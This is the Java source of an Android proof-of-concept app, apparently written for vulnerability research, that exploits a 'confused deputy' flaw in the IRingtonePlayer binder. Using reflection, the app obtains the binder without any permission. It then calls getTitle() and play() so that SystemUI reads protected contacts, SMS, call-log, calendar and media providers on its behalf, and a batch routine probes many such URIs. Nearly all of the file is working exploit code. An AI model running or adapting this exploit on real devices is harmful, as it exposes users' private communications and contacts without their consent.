package com.poc.v18;

import android.app.Activity;
import android.content.Context;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.lang.reflect.Method;

/**
 * V-18+V-19: RingtonePlayer Confused Deputy PoC
 *
 * Demonstrates that any app (ZERO permissions) can:
 * 1. Obtain the IRingtonePlayer Binder via AudioManager (no permission check)
 * 2. Call getTitle(uri) to read metadata from protected ContentProviders
 *    using SystemUI's elevated privileges (READ_CONTACTS, READ_PHONE_STATE, etc.)
 * 3. Call play(uri) to trigger SystemUI to open arbitrary content:// URIs
 *
 * This app declares ZERO permissions in its AndroidManifest.xml.
 */
public class ConfusedDeputyActivity extends Activity {

    private static final String TAG = "RingtonePoC";
    private TextView mLogView;
    private Object mRingtonePlayer; // IRingtonePlayer binder proxy

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ScrollView scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        TextView title = new TextView(this);
        title.setText("V-18 RingtonePlayer Confused Deputy PoC");
        title.setTextSize(18);
        layout.addView(title);

        TextView info = new TextView(this);
        info.setText("This app has ZERO permissions.\nIt uses SystemUI's privileges to read protected data.");
        info.setPadding(0, 16, 0, 16);
        layout.addView(info);

        // Button 1: Get Binder
        Button btnGetBinder = new Button(this);
        btnGetBinder.setText("Step 1: Get IRingtonePlayer Binder");
        btnGetBinder.setOnClickListener(v -> getBinder());
        layout.addView(btnGetBinder);

        // Button 2: getTitle on contacts
        Button btnTitleContacts = new Button(this);
        btnTitleContacts.setText("Step 2: getTitle(contacts) - Read contact name");
        btnTitleContacts.setOnClickListener(v ->
                testGetTitle("content://com.android.contacts/contacts/1"));
        layout.addView(btnTitleContacts);

        // Button 3: getTitle on SMS
        Button btnTitleSms = new Button(this);
        btnTitleSms.setText("Step 3: getTitle(sms) - Read SMS metadata");
        btnTitleSms.setOnClickListener(v ->
                testGetTitle("content://sms/inbox"));
        layout.addView(btnTitleSms);

        // Button 4: getTitle on media
        Button btnTitleMedia = new Button(this);
        btnTitleMedia.setText("Step 4: getTitle(media) - Read media metadata");
        btnTitleMedia.setOnClickListener(v ->
                testGetTitle("content://media/external/audio/media"));
        layout.addView(btnTitleMedia);

        // Button 5: getTitle on call log
        Button btnTitleCallLog = new Button(this);
        btnTitleCallLog.setText("Step 5: getTitle(call_log) - Read call log");
        btnTitleCallLog.setOnClickListener(v ->
                testGetTitle("content://call_log/calls/1"));
        layout.addView(btnTitleCallLog);

        // Button 6: play() with arbitrary URI
        Button btnPlay = new Button(this);
        btnPlay.setText("Step 6: play(contacts photo URI) - Trigger file read");
        btnPlay.setOnClickListener(v ->
                testPlay("content://com.android.contacts/contacts/1/photo"));
        layout.addView(btnPlay);

        // Button 7: Batch test all common providers
        Button btnBatch = new Button(this);
        btnBatch.setText("Batch: Test multiple protected URIs");
        btnBatch.setOnClickListener(v -> batchTest());
        layout.addView(btnBatch);

        // Log output
        mLogView = new TextView(this);
        mLogView.setPadding(0, 32, 0, 0);
        mLogView.setTextIsSelectable(true);
        mLogView.setText("--- Log output ---\n");
        layout.addView(mLogView);

        scrollView.addView(layout);
        setContentView(scrollView);
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> mLogView.append(msg + "\n"));
    }

    /**
     * Step 1: Obtain IRingtonePlayer Binder via reflection.
     * AudioManager.getRingtonePlayer() is @hide but AudioService.getRingtonePlayer()
     * has NO permission check — it directly returns the Binder.
     */
    private void getBinder() {
        try {
            AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

            // Method 1: Try AudioManager.getRingtonePlayer() via reflection
            Method getRingtonePlayer = AudioManager.class.getDeclaredMethod("getRingtonePlayer");
            getRingtonePlayer.setAccessible(true);
            mRingtonePlayer = getRingtonePlayer.invoke(am);

            if (mRingtonePlayer != null) {
                log("[+] SUCCESS: Got IRingtonePlayer Binder!");
                log("    Binder class: " + mRingtonePlayer.getClass().getName());
                log("    This Binder runs in SystemUI process (com.android.systemui)");
                log("    SystemUI has: READ_CONTACTS, READ_PHONE_STATE, READ_EXTERNAL_STORAGE, etc.");
            } else {
                log("[-] FAILED: getRingtonePlayer() returned null");
                log("    Trying alternative method...");
                getBinderAlternative();
            }
        } catch (Exception e) {
            log("[-] Reflection failed: " + e.getMessage());
            log("    Trying alternative method...");
            getBinderAlternative();
        }
    }

    /**
     * Alternative: Get the Binder via IAudioService directly
     */
    private void getBinderAlternative() {
        try {
            // Get IAudioService binder
            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
            Method getService = serviceManager.getDeclaredMethod("getService", String.class);
            IBinder audioServiceBinder = (IBinder) getService.invoke(null, Context.AUDIO_SERVICE);

            // Get IAudioService proxy
            Class<?> iAudioServiceStub = Class.forName("android.media.IAudioService$Stub");
            Method asInterface = iAudioServiceStub.getDeclaredMethod("asInterface", IBinder.class);
            Object audioService = asInterface.invoke(null, audioServiceBinder);

            // Call getRingtonePlayer()
            Method getRingtonePlayer = audioService.getClass().getDeclaredMethod("getRingtonePlayer");
            mRingtonePlayer = getRingtonePlayer.invoke(audioService);

            if (mRingtonePlayer != null) {
                log("[+] SUCCESS (alternative): Got IRingtonePlayer Binder!");
                log("    Binder class: " + mRingtonePlayer.getClass().getName());
            } else {
                log("[-] FAILED: Both methods returned null");
            }
        } catch (Exception e) {
            log("[-] Alternative also failed: " + e.getMessage());
        }
    }

    /**
     * Test getTitle() — reads metadata from arbitrary content:// URI
     * using SystemUI's privileges.
     *
     * IRingtonePlayer.getTitle(Uri uri) has NO caller check.
     * It calls Ringtone.getTitle(getContextForUser(callingUser), uri)
     * which queries the ContentProvider for _display_name or title columns.
     */
    private void testGetTitle(String uriString) {
        if (mRingtonePlayer == null) {
            log("[!] Get Binder first (Step 1)");
            return;
        }

        try {
            Uri uri = Uri.parse(uriString);
            Method getTitle = mRingtonePlayer.getClass().getDeclaredMethod("getTitle", Uri.class);
            String result = (String) getTitle.invoke(mRingtonePlayer, uri);

            log("[*] getTitle(" + uriString + ")");
            if (result != null && !result.isEmpty()) {
                log("[+] RESULT: \"" + result + "\"");
                log("    ^^^ Data read from protected ContentProvider via SystemUI!");
            } else {
                log("[-] Result: null/empty (provider may have no data or returned no title)");
            }
        } catch (Exception e) {
            String msg = e.getMessage();
            if (e.getCause() != null) msg = e.getCause().getMessage();
            log("[-] getTitle failed: " + msg);
        }
    }

    /**
     * Test play() — triggers SystemUI to open an arbitrary content:// URI.
     * This causes SystemUI (with its elevated privileges) to read the file
     * pointed to by the URI via MediaPlayer.
     *
     * While the data isn't directly returned to us, this demonstrates that:
     * 1. SystemUI will attempt to open ANY content:// URI we provide
     * 2. The target ContentProvider's openFile() is called with SystemUI's identity
     * 3. Side-channel observation (timing, exceptions) can leak info
     */
    private void testPlay(String uriString) {
        if (mRingtonePlayer == null) {
            log("[!] Get Binder first (Step 1)");
            return;
        }

        try {
            Uri uri = Uri.parse(uriString);

            // Build AudioAttributes via reflection
            Class<?> aaBuilderClass = Class.forName("android.media.AudioAttributes$Builder");
            Object aaBuilder = aaBuilderClass.newInstance();
            Method build = aaBuilderClass.getDeclaredMethod("build");
            Object audioAttributes = build.invoke(aaBuilder);

            // Need a token (IBinder) — use our own Binder
            IBinder token = new android.os.Binder();

            // Call play(IBinder token, Uri uri, AudioAttributes aa, float volume, boolean looping)
            Method play = mRingtonePlayer.getClass().getDeclaredMethod(
                    "play", IBinder.class, Uri.class,
                    Class.forName("android.media.AudioAttributes"),
                    float.class, boolean.class);

            log("[*] play(" + uriString + ")");
            log("    Triggering SystemUI to open this URI with its privileges...");

            play.invoke(mRingtonePlayer, token, uri, audioAttributes, 0.0f, false);

            log("[+] play() called successfully — SystemUI attempted to open the URI");
            log("    Check logcat for SystemUI/MediaPlayer errors:");
            log("    adb logcat -s RingtonePlayer MediaPlayer");

            // Stop after a moment
            new android.os.Handler(getMainLooper()).postDelayed(() -> {
                try {
                    Method stop = mRingtonePlayer.getClass().getDeclaredMethod("stop", IBinder.class);
                    stop.invoke(mRingtonePlayer, token);
                    log("[*] Stopped playback");
                } catch (Exception e) {
                    // ignore
                }
            }, 2000);

        } catch (Exception e) {
            String msg = e.getMessage();
            if (e.getCause() != null) msg = e.getCause().getMessage();
            log("[-] play failed: " + msg);
        }
    }

    /**
     * Batch test: Try getTitle() on multiple protected content providers
     */
    private void batchTest() {
        if (mRingtonePlayer == null) {
            log("[!] Get Binder first (Step 1)");
            return;
        }

        log("=== Batch Test: Probing protected ContentProviders via getTitle() ===");

        String[] testUris = {
                "content://com.android.contacts/contacts/1",
                "content://com.android.contacts/contacts/2",
                "content://com.android.contacts/contacts/3",
                "content://sms/inbox/1",
                "content://sms/inbox/2",
                "content://call_log/calls/1",
                "content://call_log/calls/2",
                "content://media/external/audio/media/1",
                "content://media/external/images/media/1",
                "content://com.android.calendar/events/1",
                "content://user_dictionary/words",
        };

        for (String uriStr : testUris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Method getTitle = mRingtonePlayer.getClass().getDeclaredMethod("getTitle", Uri.class);
                String result = (String) getTitle.invoke(mRingtonePlayer, uri);

                if (result != null && !result.isEmpty()) {
                    log("[+] " + uriStr + " => \"" + result + "\"");
                } else {
                    log("[ ] " + uriStr + " => (empty/null)");
                }
            } catch (Exception e) {
                String msg = (e.getCause() != null) ? e.getCause().getMessage() : e.getMessage();
                log("[x] " + uriStr + " => ERROR: " + msg);
            }
        }

        log("=== Batch Test Complete ===");
    }
}
